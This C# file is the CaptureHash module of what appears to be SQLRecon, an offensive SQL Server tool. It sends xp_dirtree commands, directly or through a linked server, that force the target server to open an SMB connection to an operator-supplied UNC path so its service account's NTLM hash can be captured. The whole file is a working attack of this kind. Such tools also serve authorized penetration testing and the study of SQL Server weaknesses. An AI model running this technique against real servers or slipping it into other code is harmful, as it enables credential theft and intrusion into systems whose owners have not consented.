using System.Data.SqlClient;

namespace SQLRecon.Modules
{
    internal class CaptureHash
    {
        private static readonly SqlQuery _sqlQuery = new();

        /// <summary>
        /// This constructor will instruct the remote SQL server to solicit
        /// a SMB reqeuest to a supplied UNC path.
        /// </summary>
        /// <param name="con">Connection to SQL Server</param>
        /// <param name="smbShare">The user supplied UNC path</param>
        /// <param name="linkedSQLServer">A Linked SQL Server, if specified</param>
        public CaptureHash(SqlConnection con, string smbShare, string linkedSQLServer = "null")
        {

            _ = (linkedSQLServer.Equals("null")) 
                ? _sqlQuery.ExecuteCustomQuery(con, "EXEC master..xp_dirtree \"" + smbShare + "\";")
                : _sqlQuery.ExecuteCustomQuery(con, "select * from openquery(\"" + linkedSQLServer + 
                "\", 'SELECT 1; EXEC master..xp_dirtree \"" + smbShare + "\";')");
        }
    }
}